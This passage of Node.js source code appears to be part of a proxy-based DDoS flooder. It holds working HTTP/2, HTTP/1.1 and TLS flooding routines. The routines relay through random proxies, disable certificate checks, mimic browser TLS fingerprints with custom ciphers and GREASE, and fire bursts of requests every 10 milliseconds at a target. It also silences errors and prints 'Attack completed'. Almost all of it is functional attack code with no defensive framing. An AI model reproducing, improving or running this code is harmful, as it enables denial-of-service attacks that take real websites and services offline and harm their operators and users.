    };
}

function runHyperFlooder() {
    if (proxies.length === 0) return;
    
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyAddr) return;
    
    const parsedProxy = proxyAddr.split(":");
    if (parsedProxy.length < 2) return;
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 100);
        connection.setNoDelay(true);

        const customCiphers = "GREASE:" + [
            ...cplist,
            defaultCiphers[2],
            defaultCiphers[1],
            defaultCiphers[0],
            ...defaultCiphers.slice(3)
        ].join(":");

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2", "http/1.1", "spdy/3.1"],
            ciphers: customCiphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol,
            maxVersion: 'TLSv1.2',
            minVersion: 'TLSv1.2',
            sessionTimeout: 0,
            ticketKeys: crypto.randomBytes(48)
        };

        try {
            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
            
            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 100);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    maxFrameSize: 16384,
                    enablePush: false,
                    enableConnectProtocol: true,
                    initialWindowSize: 65535,
                    maxHeaderListSize: 65536
                },
                maxSessionMemory: 65536,
                maxDeflateDynamicTableSize: 4294967295,
                maxSendHeaderBlockLength: 65536,
                maxHeaderListPairs: 1024,
                createConnection: () => tlsConn,
                socket: connection,
            });

            client.settings({
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                maxFrameSize: 16384,
                enablePush: false
            });

            client.setMaxListeners(0);

            client.on("connect", () => {
                const headers = generateRandomHeaders();
                const attackInterval = setInterval(() => {
                    // Send burst of 10 requests
                    for (let i = 0; i < 10; i++) {
                        try {
                            const request = client.request(headers);
                            globalStats.totalRequests++;
                            globalStats.successfulRequests++;
                            
                            request.on("response", () => {
                                request.close();
                                request.destroy();
                            });
                            
                            request.on("error", () => {
                                globalStats.failedRequests++;
                            });
                            
                            request.end();
                            
                            // Send additional request
                            const req2 = client.request(headers);
                            globalStats.totalRequests++;
                            
                            req2.on("response", () => {
                                req2.close();
                                req2.destroy();
                            });
                            
                            req2.on("error", () => {
                                globalStats.failedRequests++;
                            });
                            
                            req2.end();
                        } catch (e) {
                            globalStats.failedRequests++;
                        }
                    }
                }, 10);

                client.on("error", () => {
                    clearInterval(attackInterval);
                    client.destroy();
                    connection.destroy();
                });
                
                client.on("close", () => {
                    clearInterval(attackInterval);
                    client.destroy();
                    connection.destroy();
                });
            });

            client.on("close", () => {
                client.destroy();
                connection.destroy();
            });

            client.on("error", () => {
                client.destroy();
                connection.destroy();
                globalStats.failedRequests++;
            });
        } catch (e) {
            connection.destroy();
            globalStats.failedRequests++;
        }
    });
}

function runHTTP1Flooder() {
    if (proxies.length === 0) return;
    
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyAddr) return;
    
    const parsedProxy = proxyAddr.split(":");
    if (parsedProxy.length < 2) return;
    
    const options = {
        proxyHost: parsedProxy[0],
        proxyPort: ~~parsedProxy[1],
        host: parsedTarget.host,
        path: parsedTarget.path || '/'
    };

    Socker.HTTP1(options, (connection, error) => {
        if (error) return;
        
        connection.setKeepAlive(true, 100);
        connection.setNoDelay(true);
        
        // Send additional requests on same connection
        const sendMore = () => {
            const payload = "GET " + options.path + " HTTP/1.1\r\n" +
                           "Host: " + options.host + "\r\n" +
                           "User-Agent: " + generateUserAgent(getRandomBrowser()) + "\r\n" +
                           "Accept: " + randomElement(accept_header) + "\r\n" +
                           "Accept-Language: " + randomElement(language_header) + "\r\n" +
                           "Accept-Encoding: " + randomElement(encoding_header) + "\r\n" +
                           "Connection: keep-alive\r\n\r\n";
            
            connection.write(Buffer.from(payload));
            globalStats.totalRequests++;
        };
        
        // Send burst of requests
        for (let i = 0; i < 5; i++) {
            setTimeout(sendMore, i * 10);
        }
        
        // Close after sending
        setTimeout(() => {
            connection.destroy();
        }, 100);
    });
}

function runTLSFlooder() {
    // Direct TLS connection without proxy
    try {
        const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: randomElement(cplist),
            sigalgs: sigalgs,
            requestCert: true,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(tlsOptions);
        
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 100);
        
        tlsConn.on("secureConnect", () => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn
            });

            client.on("connect", () => {
                const headers = generateRandomHeaders();
                
                // Send immediate burst
                for (let i = 0; i < 3; i++) {
                    try {
                        const request = client.request(headers);
                        globalStats.totalRequests++;
                        
                        request.on("response", () => {
                            request.close();
                            request.destroy();
                        });
                        
                        request.on("error", () => {});
                        
                        request.end();
                    } catch (e) {}
                }
                
                // Close quickly
                setTimeout(() => {
                    client.destroy();
                    tlsConn.destroy();
                }, 50);
            });
        });
        
        tlsConn.on("error", () => {
            tlsConn.destroy();
        });
        
        tlsConn.setTimeout(5000, () => {
            tlsConn.destroy();
        });
    } catch (e) {}
}

const StopScript = () => {
    console.log('\n[!] Attack completed'.green);
    process.exit(1);
};

setTimeout(StopScript, args.time * 1000);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.on('SIGINT', () => process.exit(0));
process.on('SIGTERM', () => process.exit(0));